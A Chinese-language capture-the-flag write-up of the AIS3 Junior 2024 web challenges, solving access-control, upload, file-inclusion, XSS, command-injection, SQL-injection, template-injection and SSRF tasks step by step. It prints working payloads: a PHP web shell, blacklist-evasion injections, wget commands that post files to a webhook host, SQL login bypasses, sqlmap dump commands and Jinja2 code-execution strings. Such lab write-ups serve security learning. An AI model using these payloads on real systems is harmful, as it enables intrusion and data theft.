# AIS3 Junior 2024 webCTF
## MENU
- [01 - Broken Access Control](#01-Broken_Access_Control)
- [02 - File Upload](#02-File_Upload)
- [03 - Local File Inclusion](#03-Local_File_Inclusion)
- [04 - Cross-Site Scripting](#04-Cross-Site_Scripting)
- [05 - Command Injection](#05-Command_Injection)
- [06 - SQL Injection](#06-SQL_Injection)
- [07 - Server-Side Template Injection](#07-Server-Side_Template_Injection)
- [08 - Server-Side Request Forgery](#08-Server-Side_Request_Forgery)

## 01-Broken_Access_Control
### BAC01
### Step 1: 
系統問我是誰，想當然輸入admin
![image](https://hackmd.io/_uploads/H1va8PR9R.png)
### Step 2:
根據網頁回應，目前是user permission，網址列中出現user
![image](https://hackmd.io/_uploads/HknFvDAqA.png)
### Step 3:
既然都出現userㄌ，就把它改成admin嘗試越權，網頁及即吐出FLAG！
### FLAG : AIS3_Junior{FirstBROKENAccessControl;)}.

![image](https://hackmd.io/_uploads/SJAgdw0cC.png)

### BAC02
### Step 1:
進去後發現有右上角有Product list 跟 Admin Panel
![image](https://hackmd.io/_uploads/ByhptvC5C.png)
### Step 2:
點Product list後發現商品琳瑯滿目
![image](https://hackmd.io/_uploads/r1PhjvA9R.png)
### Step 3:
隨便點一個發現後面有商品ID
![image](https://hackmd.io/_uploads/rJtUnw0qA.png)
### Step 4:
把ID隨便試試發現4是FLAG商品而且僅需0比特幣，對於身無分文的我買得起。
![image](https://hackmd.io/_uploads/H1Eu2DCqC.png)
### Step 5:
因此直接買下，購得FLAG
### FLAG : AIS3_Junior{BroJustFoundBabyIDORVulnerability}
![image](https://hackmd.io/_uploads/By1F2w05A.png)

### BAC02
### Step 1:
看到跟BAC01一樣的網站，直接用同樣的方法打至/admin
發現被導至ERROR
![image](https://hackmd.io/_uploads/HJlQ6wR50.png)
### Step 2:
去Burp中的HTTP History看，發現其實admin有請求成功，並獲得FLAG
### FLAG：AIS3_Junior{BabyBRokenAccEssControoooooool}
![image](https://hackmd.io/_uploads/SkwsTwR5A.png)

## 02-File_Upload
### FIL 01
### Step 1:
看到右上角有Upload Area，點他便進到檔案上傳頁面中
![image](https://hackmd.io/_uploads/Hk9bkd09C.png)
### Step 2:
製作一個php檔案，內含```<?php system($_GET['cmd']); ?>```以控制主機使我能透過網頁請求操縱它的終端機，並上傳該檔案，發現上傳成功以及上傳後檔案位於資料庫的位置。
![image](https://hackmd.io/_uploads/BJnKgOAcC.png)
### Step 3:
請求該路徑並在最後加上```cmd=ls```查看目錄中有什麼資料
![image](https://hackmd.io/_uploads/ByOaluA9C.png)
### Step 4:
發現沒有FLAG相關資料，因此改為請求```cmd=ls ../```發現父目錄中有FLAG
![image](https://hackmd.io/_uploads/HygYWuC9C.png)
![image](https://hackmd.io/_uploads/B1CWfd0qC.png)
### Step 5:
直接請求```cat ../FLAG```便可獲得FLAG
### FLAG：AIS3_Junior{FirstWEBSHELLXDDD}
![image](https://hackmd.io/_uploads/SJkPMdRcA.png)

### FIL02

### Step 1:
發現網頁一樣，嘗試以相同方法攻擊，發現php檔會被攔截
![image](https://hackmd.io/_uploads/S1RaGOC5A.png)
### Step 2:
開啟Burp Intercepte功能，將副檔名改為.jpg.php，並攔截請求，將Content-Type改為 image/jpg後按下forward
![image](https://hackmd.io/_uploads/SJSZEdRc0.png)
### Step 3:
發現上傳成功，接著以相同方式請求並獲得FLAG。
### FLAG：AIS3_Junior{BabyUploadBypass}
![螢幕擷取畫面 2024-08-18 030334](https://hackmd.io/_uploads/SJLwEOAc0.png)
![image](https://hackmd.io/_uploads/rybYEO0c0.png)

### FIL03：
還沒解開

## 03-Local_File_Inclusion

### LFI01:
### Step 1:
打開開發者模式，發現可以隨意更改請求路徑
![image](https://hackmd.io/_uploads/HJgW5OR9A.png)
### Step 2:
將其更改為index.php並打開便發現一段判斷式，可得知帳密
![image](https://hackmd.io/_uploads/H16a9OC50.png)
![image](https://hackmd.io/_uploads/H1-a9dAcA.png)

### Step 3:
在網站中輸入帳密```admin:CATLOVEBITCOINMEOWMEOW```便可獲得FLAG
### FLAG：AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}
![image](https://hackmd.io/_uploads/HyiWi_A50.png)
![image](https://hackmd.io/_uploads/SyNMiuRc0.png)

### LFI02:
### Step 1:
上傳之前打FIL的PHP時，發現網站請求方式```post.php?form=form.html```有機會注入
![image](https://hackmd.io/_uploads/rJZaT_0cC.png)
### Step 2:
將form改為檔案路徑並加上```&cmd=ls```，發現有一個名為```S3Cr3TFLAGGGGG```的檔案很可能是FLAG
![image](https://hackmd.io/_uploads/HJveCdC90.png)
![image](https://hackmd.io/_uploads/rJSXR_CqR.png)
### Step 3:
直接cat那個檔案，獲得FLAG
### FLAG：AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}
![image](https://hackmd.io/_uploads/ry75AO090.png)

### LFI03:
還沒打

## 04-Cross-Site_Scripting
### XSS01
### Step1:
在console輸入
```JS
alert(FLAG)
```
就中FLAG了XD
~~我是通靈王~~
###  FLAG:AIS3_Junior{XSSXSSXSSXSS}
![image](https://hackmd.io/_uploads/rywPJRAcC.png)

![image](https://hackmd.io/_uploads/SJV810R5A.png)

## 05-Command_Injection
### CMD01
### Step1:
發現他是ping test，嘗試加入換行符號輸入指令，發現成功，並且資料夾中有FLAG
![image](https://hackmd.io/_uploads/BJ2ZYCAcA.png)
![image](https://hackmd.io/_uploads/SJvvF0CcR.png)

### Step2：
直接將ls改為cat FLAG即可獲得FLAG
### FLAG:AIS3_Junior{BabyCommand;InjectionXDDDddddd}
![image](https://hackmd.io/_uploads/rJzstAC5R.png)
![image](https://hackmd.io/_uploads/By_JqA090.png)


### CMD02
### Step1：
發現ls被ban，我一怒之下直接輸入```grep -r AIS3``` ，FLAG就出來了	ミﾟДﾟ彡
### FLAG：AIS3_Junior{niceWordBL$()ACKListEvasion;)}
![image](https://hackmd.io/_uploads/HyII9A0cA.png)
![image](https://hackmd.io/_uploads/H1m2qCRq0.png)
![image](https://hackmd.io/_uploads/HyGRqR0c0.png)


### CMD03
### Step1：
輸入cat FLAG時被擋，看似是因為空格會被擋，因此將空格改為```${IFS}```便可獲得FLAG
### FLAG：AIS3_Junior{BashOperato\|rEvasion${IFS}SUCC\|ESSFUL\|:DDDDD}
![image](https://hackmd.io/_uploads/rJsBiR0qA.png)
![image](https://hackmd.io/_uploads/B1SKoR0cR.png)
![image](https://hackmd.io/_uploads/Syb5s0C5A.png)

### CMD04
### Step1：
隨意輸入網址，發現網頁不會回報訊息。並且ls被鎖因此先利用```|echo${IFS}bHM=|base64${IFS}-d|/bin/sh>cool.txt```做一個檔案存ls結果，並透過解碼base64來規避黑名單系統監督。
![image](https://hackmd.io/_uploads/B1naxk1oR.png)
![image](https://hackmd.io/_uploads/rk2LrJko0.png)

### Step2：
利用wget傳送檔案的值至webhook```|wget${IFS}--post-file=cool.txt${IFS}https://webhook.site/87f7ee46-d0bc-42b1-bbf9-1d2f8d0ca56e```
![image](https://hackmd.io/_uploads/rkuptkkoC.png)
### Step3：
看到ERRORCMDi_FLAG檔案，將他編碼並存起```|base64${IFS}ERRORCMDi_FLAG>cool```
![image](https://hackmd.io/_uploads/HyHX5JkiC.png)
### Step4：
將其傳送至webhook並解碼即可獲得FLAG：  
我安裝了d3coder所以看起來才是明碼
### FLAG:AIS3_Junior{E${IFS}RRORB3sed\|\$(CMDi)Succ3ss:DD}
![image](https://hackmd.io/_uploads/H1et5JysR.png)
![image](https://hackmd.io/_uploads/r1w2c1kiC.png)

### CMD05
### Step1：
步驟與上題一致
```shell=
|echo${IFS}bHM=|base64${IFS}-d|/bin/sh>cool.txt
|wget${IFS}--post-file=cool.txt${IFS}https://webhook.site/87f7ee46-d0bc-42b1-bbf9-1d2f8d0ca56e
|base64${IFS}BLindCMDiFLAG>cool
|wget${IFS}--post-file=cool${IFS}https://webhook.site/87f7ee46-d0bc-42b1-bbf9-1d2f8d0ca56e
```
### FLAG:AIS3_Junior{BROJust\|curl%20-d%20$(l3akTheDATAT0outSideXDD)}
![image](https://hackmd.io/_uploads/SJ-uf1yo0.png)
![image](https://hackmd.io/_uploads/ryzczJkoR.png)

### CMD06
### Step1：
試了很多次發現```localhost|grep${IFS}-r${IFS}AIS3```可以獲得FLAG
### FLAG：FLAG:AIS3_Junior{ouo_hihi}
![image](https://hackmd.io/_uploads/HkcNn0A9C.png)
![image](https://hackmd.io/_uploads/Bk8Hh0Cc0.png)

## 06-SQL_Injection
### SQL01
### Step1:
看到是SQL，登入，我憑直覺直接在帳號輸入admin，密碼'OR 1=1--，直接獲得FLAG。
### FLAG：AIS3_Junior{SQL'InjectionXDorD=D_--_-}
![image](https://hackmd.io/_uploads/Syg62yki0.png)
![image](https://hackmd.io/_uploads/Hyna211jC.png)


### SQL02
### STEP1:
利用SQLMAP慢慢往深搜，即可搜到admin帳密
```sqlmap
sqlmap -u "http://ctfd-ais3.crazyfirelee.tw:9052/" --batch --dbs --forms --crawl=2 
sqlmap -u "http://ctfd-ais3.crazyfirelee.tw:9052/" --batch -D ApexPredators --tables --forms --crawl=2 
sqlmap -u "http://ctfd-ais3.crazyfirelee.tw:9052/" --batch -D ApexPredators -T users --columns --forms --crawl=2 
sqlmap -u "http://ctfd-ais3.crazyfirelee.tw:9052/" --batch -D ApexPredators -T users -C isAdmin --dump-all --forms --crawl=2 
```
![image](https://hackmd.io/_uploads/rkreWgkoR.png)
![image](https://hackmd.io/_uploads/rypPblyjA.png)
![image](https://hackmd.io/_uploads/H1zK-gJjA.png)
![image](https://hackmd.io/_uploads/HyGhZxJj0.png)
### STEP2:
登入即可獲得FLAG
### FLAG：AIS3_Junior{_BRO-DO_A--UNION_SELECTXDDD_--_-}
![image](https://hackmd.io/_uploads/SJQlGlyiC.png)
![image](https://hackmd.io/_uploads/BkSE7gkoC.png)

## 07-Server-Side_Template_Injection
### Ref：[link](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md)

### STI01
### Step1
直接嘗試輸入```{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read() }}```，即可獲得FLAG。

### FLAG:AIS3_Junior{.__JinjaTWOOOO.___["SSTI"]__.succ3ssXDD.__}
![image](https://hackmd.io/_uploads/rk2_r0A50.png)
![image](https://hackmd.io/_uploads/BkhYS0AcR.png)

### STI02
### Step1
嘗試輸入相同模板，發現成功了:D
### FLAG：AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}
![image](https://hackmd.io/_uploads/rJ5fvRCcA.png)

### STI03
### Step1
輸入相同模板，發現系統有擋:D
![image](https://hackmd.io/_uploads/ryPDwRAcA.png)
### Step2:
問chatGPT發現能夠以以下方式獲得相同效果
```tamplate=
{% set cmd = self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat${IFS}FLAG').read() %}{%print(cmd)%}
```
直接輸入便獲得FLAG
### FLAG：AIS3_Junior{%.__Advanced\|attr("SSTI${IFS}FilterEvasion")__.%}
![image](https://hackmd.io/_uploads/S1rwd0AqR.png)

![image](https://hackmd.io/_uploads/SJwfOAC9A.png)

## 08-Server-Side_Request_Forgery
### SRF01
### Step1:
根據題目給的路徑```/app/FLAG```，加上這邊能夠輸入網址，因此嘗試以file:// 讀取該檔案
![image](https://hackmd.io/_uploads/BygCeA05A.png)
### Step2:
根據回傳值，即可看到FLAG的Base64編碼，進行解碼後即可獲得FLAG
### FLAG：AIS3_Junior{file://SSRF___XDDD}
![image](https://hackmd.io/_uploads/BkW6Z0R5R.png)

### SRF02

### Step1:
進入網站後發現ADMIN PANEL，進入後發現他說LOCAL ACCESS ONLY
![image](https://hackmd.io/_uploads/B1LhzAR5R.png)
![image](https://hackmd.io/_uploads/H1agm0050.png)
### Step2:
嘗試輸入localhost利用local端連線至該網站，圖片回傳值即有FLAG
### FLAG：AIS3_Junior{http://BROAccessLOCAL}
![image](https://hackmd.io/_uploads/HJrVQRC5R.png)
![image](https://hackmd.io/_uploads/S1LqmCRcA.png)


### SRF03
### Step1:
一樣使用localhost嘗試存取/local，發現有限制
![image](https://hackmd.io/_uploads/SJxZEC0c0.png)
### Step2:
改輸入```http://localtest.me/local```嘗試繞過限制，網頁即回傳FLAG
:::spoiler FLAG
#### AIS3_Junior{http://Succ3ssssBypassL0CALLimitXDDD}
:::
![image](https://hackmd.io/_uploads/Hk7KV0C9A.png)

![image](https://hackmd.io/_uploads/Syf_NRCq0.png)
